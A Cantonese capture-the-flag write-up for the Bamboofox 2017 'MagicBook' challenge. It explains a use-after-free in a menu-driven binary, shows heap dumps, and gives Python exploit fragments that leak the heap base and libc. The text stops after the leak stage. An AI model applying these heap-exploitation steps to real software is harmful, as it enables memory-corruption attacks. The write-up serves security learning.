# Bamboofox 2017 MagicBook

呢條係好簡單嘅heap overflow題,本身就應該solve到既(可惜揾錯one gadget RCE address),係到要推介下hitcon david 大大嘅 [One_gadget](https://github.com/david942j/one_gadget) ,有佢就唔洗係IDA Pro 揾(錯) one gadget RCE 

Menu:
```

oh my god!!!!
You are just a normal human.......
You can only use at most five kinds of magic (vanished).

====== Magic Book ======
  1. Add a chant.

  2. Delete a chant.

  3. spell it !!!

========================
Choose a feature :

```

有得add, delete同 spell.

Spell就係用黎call print chant 嘅 option,同時print chant本身都係chant object嘅一枝function pointer(好重要)

每一次‵call add, 首先會malloc 一個 0x10嘅chunk 放function pointer 同content pointer, 再malloc 一個由用家input size 嘅chunk 去放input content

heap view :
```
0x603010:	0x0000000000400826	0x0000000000603030
0x603020:	0x0000000000000000	0x0000000000000021
0x603030:	0x4141414141414141	0x000000000000000a
0x603040:	0x0000000000000000	0x0000000000020fc1
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000

```

而佢又有另一個table store heap address

```
0x6020a0 <list>:	0x0000000000603010	0x0000000000000000
0x6020b0 <list+16>:	0x0000000000000000	0x0000000000000000
0x6020c0 <list+32>:	0x0000000000000000	0x0000000000000000

```
個bug就係呢到,free完之後上面個table,係相應位置冇set 0,引致use after free

可以開始exploit 

不過由於無edit function 所以我地唔可以用unlink->GOT Hijacking 

普通fastbin attack 都唔得,因為add 會先malloc function pointer再malloc content

由於我地控制唔到function pointer會去乜位所以就會crash 

不過點都好我地都要leak libc, heapbase (呢到無用)

```python
print "[+] Leaking heapbase : "
add(0,128,"AAAA")
add(1,128,"BBBB")
add(2,128,"CCCC")
add(3,128,"AAAA")
free(0)
free(2)
add(0,128,"DDDDDDD")
leakk=leak("DDDDDDD",0)
heapbase=int(leakk,16)-0x180
print "heapbase :"+hex(heapbase)
add(2,128,"DDDDDDD")
free(3)
free(2)
free(1)
free(0)

print "[+] Leaking Libc : "
add(0,128,"AAAA")
add(1,128,"BBBB")
add(2,128,"CCCC")
free(0)
add(0,128,"DDDDDDD")
leakk=leak("DDDDDDD",0)
```

只要利用smallbin free完之後嘅fd bk pointer再配合puts leak libc heapbase 出黎(可以參考[Mental Snapshot - _int_free and unlink](http://uaf.io/exploitation/misc/2016/09/11/_int_free-Mental-Snapshot.html))  


